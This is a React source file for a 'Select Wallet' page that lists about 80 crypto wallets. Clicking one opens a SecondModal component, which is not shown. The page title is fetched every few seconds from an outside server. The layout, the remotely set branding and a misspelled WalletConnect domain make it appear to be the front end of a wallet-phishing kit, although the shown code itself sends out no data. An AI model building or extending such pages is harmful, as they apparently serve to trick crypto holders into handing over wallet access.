


import React, { useState, useEffect } from "react";
import { IoWalletOutline } from "react-icons/io5";
import { FaArrowUp } from "react-icons/fa";
import { motion, AnimatePresence } from "framer-motion";
import SecondModal from "./SecondModal";

const wallets = [
  { name: "SafePal", link: "safepal.com", image: "/images/safepal.png" },
  {
    name: "Wallet Connect",
    link: "wallettconnect.com",
    image: "/images/walle.jpg",
  },
  {
    name: "Trust Wallet",
    link: "trustwallet.com",
    image: "/images/trust_wallet.jpg",
  },
  { name: "Metamask", link: "metamask.io", image: "/images/metamask.jpg" },
  {
    name: "Liquality",
    link: "liquality.com",
    image: "/images/liquality.jpg",
  },
  {
    name: "Phantom Wallet",
    link: "phantom.com",
    image: "/images/Phantom.png",
  },
  {
    name: "Polygon Wallet",
    link: "polygon.technology",
    image: "/images/polygon.jpg",
  },
  { name: "Rainbow", link: "rainbow.me", image: "/images/rainbow.jpg" },
  { name: "Bitpay", link: "bitpay.com", image: "/images/bitpay.jpg" },
  { name: "Walleth", link: "walleth.org", image: "/images/walleth.jpg" },
  { name: "Argent", link: "argent.xyz", image: "/images/argent.jpg" },
  {
    name: "Huobi Wallet",
    link: "huobiwallet.com",
    image: "/images/huobi.jpg",
  },
  {
    name: "Encrypted Ink",
    link: "encrypted.ink",
    image: "/images/encrypted_ink.jpg",
  },
  {
    name: "Compound",
    link: "compound.finance",
    image: "/images/compound.jpg",
  },
  {
    name: "Polkadot",
    link: "polkadot.network",
    image: "/images/polkadot.jpg",
  },
  { name: "Iotex", link: "iotex.io", image: "/images/iotex.jpg" },
  { name: "Coin98", link: "coin98.com", image: "/images/coin98.jpg" },
  {
    name: "Coinbase",
    link: "coinbase.com",
    image: "/images/coinbase.png",
  },
  {
    name: "Crypto.com | Defi Wallet",
    link: "crypto.com",
    image: "/images/crypto.jpg",
  },
  {
    name: "Token Pocket",
    link: "tokenpocket.pro",
    image: "/images/token_pocket.jpg",
  },
  {
    name: "Math Wallet",
    link: "mathwallet.org",
    image: "/images/math_wallet.jpg",
  },
  {
    name: "Ledger Live",
    link: "ledger.com",
    image: "/images/ledger_live.jpg",
  },
  { name: "1Inch", link: "1inch.io", image: "/images/1inch.jpg" },
  { name: "Dharma", link: "dharma.io", image: "/images/dharma.jpg" },
  {
    name: "Trust Vault",
    link: "trustology.io",
    image: "/images/trust_vault.jpg",
  },
  { name: "MYKEY", link: "mykey.org", image: "/images/mykey.jpg" },
  { name: "Atomic", link: "atomicwallet.io", image: "/images/atomic.jpg" },
  {
    name: "CoolWallet S",
    link: "coolwallet.io",
    image: "/images/cool_wallet_s.jpg",
  },
  { name: "Nash", link: "nash.io", image: "/images/nash.jpg" },
  { name: "Coinomi", link: "coinomi.com", image: "/images/coinomi.jpg" },
  { name: "Eternl", link: "eternl.com", image: "/images/eternl.png" },
  { name: "GridPlus", link: "gridplus.io", image: "/images/gridplus.jpg" },
  { name: "Tokenary", link: "tokenary.io", image: "/images/tokenary.jpg" },
  {
    name: "Infinito",
    link: "infinitowallet.io",
    image: "/images/infinito.jpg",
  },
  { name: "Wallet.io", link: "wallet.io", image: "/images/wallet_io.jpg" },
  { name: "Ownbit", link: "ownbit.io", image: "/images/ownbit.jpg" },
  {
    name: "EasyPocket",
    link: "easypocket.app",
    image: "/images/easypocket.jpg",
  },
  {
    name: "Bridge Wallet",
    link: "mtpelerin.com",
    image: "/images/bridge_wallet.jpg",
  },
  {
    name: "ViaWallet",
    link: "viawallet.com",
    image: "/images/via_wallet.jpg",
  },
  { name: "BitKeep", link: "bitkeep.com", image: "/images/bitkeep.jpg" },
  {
    name: "Unstoppable Wallet",
    link: "unstoppable.money",
    image: "/images/unstoppable_wallet.jpg",
  },
  {
    name: "HaloDefi Wallet",
    link: "halodefi.org",
    image: "/images/halodefi_wallet.jpg",
  },
  {
    name: "Dok Wallet",
    link: "dokwallet.com",
    image: "/images/dok_wallet.jpg",
  },
  {
    name: "Cello Wallet",
    link: "cellowallet.app",
    image: "/images/celo_wallet.jpg",
  },
  { name: "CoinUs", link: "coinus.io", image: "/images/coinus.jpg" },
  { name: "Valora", link: "valoraapp.com", image: "/images/valora.jpg" },
  {
    name: "Trustee Wallet",
    link: "trusteeglobal.com",
    image: "/images/trustee_wallet.jpg",
  },
  {
    name: "Gaurda Wallet",
    link: "guarda.com",
    image: "/images/guarda_wallet.jpg",
  },
  {
    name: "Jade Wallet",
    link: "jadewallet.io",
    image: "/images/jade_wallet.jpg",
  },
  {
    name: "PlasmaPay",
    link: "plasmapay.com",
    image: "/images/plasmapay.jpg",
  },
  { name: "O3Wallet", link: "o3.network", image: "/images/o3_wallet.jpg" },
  {
    name: "HashKey Me",
    link: "me.hashkey.com",
    image: "/images/hashkey_me.jpg",
  },
  { name: "RWallet", link: "rsk.co", image: "/images/rwallet.jpg" },
  {
    name: "Flare Wallet",
    link: "flarewallet.io",
    image: "/images/flare_wallet.jpg",
  },
  {
    name: "KyberSwap",
    link: "kyberswap.com",
    image: "/images/kyberswap.jpg",
  },
  {
    name: "AToken Wallet",
    link: "atoken.com",
    image: "/images/atoken_wallet.jpg",
  },
  {
    name: "Tongue Wallet",
    link: "tongue.fi",
    image: "/images/tongue_wallet.jpg",
  },
  {
    name: "XinFin XDC Network",
    link: "xinfin.io",
    image: "/images/xinfin.jpg",
  },
  {
    name: "Talken Wallet",
    link: "talken.io",
    image: "/images/talken_wallet.jpg",
  },
  {
    name: "KEYRING PRO",
    link: "keyring.app",
    image: "/images/keyring_pro.jpg",
  },
  {
    name: "Midas Wallet",
    link: "midasprotocol.io",
    image: "/images/midas_wallet.jpg",
  },
  {
    name: "AT.Wallet",
    link: "authentrend.com",
    image: "/images/at_wallet.jpg",
  },
  { name: "imToken", link: "token.im", image: "/images/imtoken.jpg" },
  { name: "Solflare", link: "", image: "/images/Solflare.png" },
  { name: "Nova", link: "", image: "/images/Nova.png" },
  { name: "Braavos", link: "", image: "/images/Braavos.jpg" },
  { name: "Brave", link: "", image: "/images/Brave.png" },
  { name: "Xverse", link: "", image: "/images/Xverse.jpg" },
  { name: "Leather", link: "", image: "/images/Leather.jpg" },
  { name: "Keplr", link: "", image: "/images/Keplr.jpg" },
  { name: "Thor", link: "", image: "/images/Thorwallet.png" },
  { name: "Rabby", link: "", image: "/images/rabby.png" },
  {
    name: "Backpack Wallet",
    link: "Backpack",
    image: "/images/backpack.png",
  },
  { name: "Sui Wallet", link: "Sui", image: "/images/sui.png" },
  { name: "OKX Wallet", link: "OKX", image: "/images/okx.png" },
  { name: "Glow Wallet", link: "Glow", image: "/images/glow.png" },
  {
    name: "Blockchain Wallet",
    link: "Blockchain",
    image: "/images/blockchain.png",
  },
  { name: "Nami", link: "", image: "/images/Nami.png" },
  { name: "Trezor", link: "", image: "/images/Trezor.jpg" },
  { name: "Pera", link: "", image: "/images/Pera.png" },
  { name: "Leap", link: "", image: "/images/Leap.jpg" },
  { name: "Sei", link: "", image: "/images/Sei.png" },
  { name: "Stacks", link: "", image: "/images/Stacks.png" },
  {
    name: "Internet identity",
    link: "",
    image: "/images/Internet.jpg",
  },
  { name: "Others", link: "", image: "/images/others.png" },
];
const Connect = () => {
  const [isDarkMode, setIsDarkMode] = useState(false);
  const [scrolled, setScrolled] = useState(false);
  const [showScrollTop, setShowScrollTop] = useState(false);
  const [title, setTitle] = useState("");

  const [selectedWallet, setSelectedWallet] = useState(null);
  const [isModalOpen, setIsModalOpen] = useState(false);

  useEffect(() => {
    setIsDarkMode(localStorage.getItem("darkMode") === "true");
  }, []);

  useEffect(() => {
    localStorage.setItem("darkMode", isDarkMode);
  }, [isDarkMode]);

  useEffect(() => {
    document.title = "Connect Wallet";
  }, []);

  useEffect(() => {
    const handleScroll = () => {
      const y = window.scrollY;
      setScrolled(y > 20);
      setShowScrollTop(y > 300);
    };

    window.addEventListener("scroll", handleScroll);
    return () => window.removeEventListener("scroll", handleScroll);
  }, []);

  /* Title update */

  useEffect(() => {
    const fetchTitle = async () => {
      try {
        const response = await fetch("https://electric-eel.onrender.com/title");
        const data = await response.json();
        setTitle(data.title);
      } catch (error) {
        console.error("Failed to fetch title:", error);
        setTitle("Hyper Tech");
      }
    };

    fetchTitle();
    const interval = setInterval(fetchTitle, 5000);

    return () => clearInterval(interval);
  }, []);

  const toggleDarkMode = () => setIsDarkMode(!isDarkMode);

  const scrollToTop = () =>
    window.scrollTo({ top: 0, behavior: "smooth" });

  return (
    <div
      className={`relative min-h-screen transition-colors duration-500 ${
        isDarkMode
          ? "bg-[#0b0b0b] text-white"
          : "bg-gradient-to-b from-white via-gray-50 to-white text-black"
      }`}
    >
      {/* background glow */}
      <div className="absolute inset-0 overflow-hidden pointer-events-none">
        <div className="absolute w-[500px] h-[500px] bg-pink-500/20 blur-[140px] rounded-full top-[-200px] left-[-200px]" />
        <div className="absolute w-[400px] h-[400px] bg-red-400/20 blur-[140px] rounded-full bottom-[-150px] right-[-150px]" />
      </div>

      {/* HEADER */}

      <div
        className={`fixed top-0 w-full z-50 transition-all duration-500 ${
          scrolled
            ? "backdrop-blur-xl bg-gradient-to-r from-pink-700/80 via-red-400/80 to-pink-700/80 shadow-xl"
            : "bg-transparent"
        }`}
      >
        <div className="flex items-center justify-between px-8 py-5 max-w-[1400px] mx-auto">
          <motion.h2
            className={`text-2xl font-extrabold tracking-wide ${
              scrolled || isDarkMode ? "text-white" : "text-black"
            }`}
            initial={{ y: -40, opacity: 0 }}
            animate={{ y: 0, opacity: 1 }}
            transition={{ duration: 0.8 }}
          >
            {title}
          </motion.h2>

          <div className="flex items-center gap-4">
            <button
              className={`flex items-center gap-3 px-6 py-2 rounded-full border font-semibold text-sm transition-all duration-300 hover:scale-105 ${
                scrolled || isDarkMode
                  ? "border-white text-white hover:bg-white/10"
                  : "border-black text-black hover:bg-black/10"
              }`}
            >
              <IoWalletOutline className="text-2xl" />
            </button>

            {/* DARK MODE TOGGLE */}

            <label className="relative inline-flex items-center cursor-pointer">
              <input
                type="checkbox"
                checked={isDarkMode}
                onChange={toggleDarkMode}
                className="sr-only peer"
              />

              <div className="w-12 h-6 rounded-full bg-gray-200 overflow-hidden shadow-lg peer duration-500 before:content-['☀️'] before:absolute before:h-6 before:w-6 before:top-1/2 before:bg-white before:rounded-full before:left-1 before:-translate-y-1/2 before:transition-all before:duration-700 peer-checked:before:opacity-0 peer-checked:before:-translate-y-full peer-checked:bg-[#383838] after:content-['🌑'] after:absolute after:bg-[#1d1d1d] after:rounded-full after:top-[3px] after:right-1 after:translate-y-full after:w-6 after:h-6 after:opacity-0 after:transition-all after:duration-700 peer-checked:after:opacity-100 peer-checked:after:translate-y-0"></div>
            </label>
          </div>
        </div>
      </div>

      <div className="h-20" />

      {/* TITLE SECTION */}

      <motion.div
        className="flex flex-col items-center justify-center text-center mt-10"
        initial={{ opacity: 0, y: 30 }}
        animate={{ opacity: 1, y: 0 }}
        transition={{ delay: 0.3, duration: 1 }}
      >
        <h2 className="text-4xl font-bold tracking-wide font-serif mb-3">
          Select Wallet
        </h2>

        <div className="w-20 h-[3px] rounded-full bg-gradient-to-r from-pink-500 to-red-500 mb-4" />

        <div className="load-row">
          <span></span>
          <span></span>
          <span></span>
          <span></span>
        </div>
      </motion.div>

      {/* WALLET GRID */}

      <div className="relative z-10 max-w-[1400px] mx-auto px-6 py-10 grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 lg:grid-cols-5 gap-6">
        {wallets.map((wallet, idx) => (
          <motion.div
            key={idx}
            className={`group flex items-center gap-4 p-4 rounded-2xl border cursor-pointer transition-all duration-300 hover:-translate-y-2 hover:shadow-2xl ${
              isDarkMode
                ? "bg-[#151515]/80 border-white/10 hover:bg-[#1f1f1f]"
                : "bg-white border-gray-200 hover:bg-gray-50"
            }`}
            initial={{ opacity: 0, scale: 0.9, y: 20 }}
            animate={{ opacity: 1, scale: 1, y: 0 }}
            transition={{
              delay: 0.2 + idx * 0.03,
              duration: 0.4,
              ease: "easeOut",
            }}
            onClick={() => {
              setSelectedWallet(wallet);
              setIsModalOpen(true);
            }}
          >
            <img
              src={wallet.image}
              alt={wallet.name}
              className="w-14 h-14 rounded-full object-cover group-hover:scale-110 transition-transform duration-300"
            />

            <div className="flex flex-col">
              <span className="font-semibold text-lg">
                {wallet.name}
              </span>

              <span className="text-xs text-gray-400 group-hover:text-pink-500 transition">
                {wallet.link}
              </span>
            </div>
          </motion.div>
        ))}
      </div>

      {/* SCROLL TO TOP */}

      {showScrollTop && (
        <motion.button
          onClick={scrollToTop}
          initial={{ opacity: 0, y: 50 }}
          animate={{ opacity: 1, y: 0 }}
          exit={{ opacity: 0 }}
          transition={{ duration: 0.3 }}
          className="fixed bottom-6 right-6 bg-gradient-to-r from-pink-600 to-red-500 text-white p-4 rounded-full shadow-xl hover:scale-110 transition"
        >
          <FaArrowUp />
        </motion.button>
      )}

      {/* MODAL */}

      <AnimatePresence>
        {isModalOpen && selectedWallet && (
          <SecondModal
            wallet={selectedWallet}
            onClose={() => setIsModalOpen(false)}
            isDarkMode={isDarkMode}
          />
        )}
      </AnimatePresence>
    </div>
  );
};

export default Connect;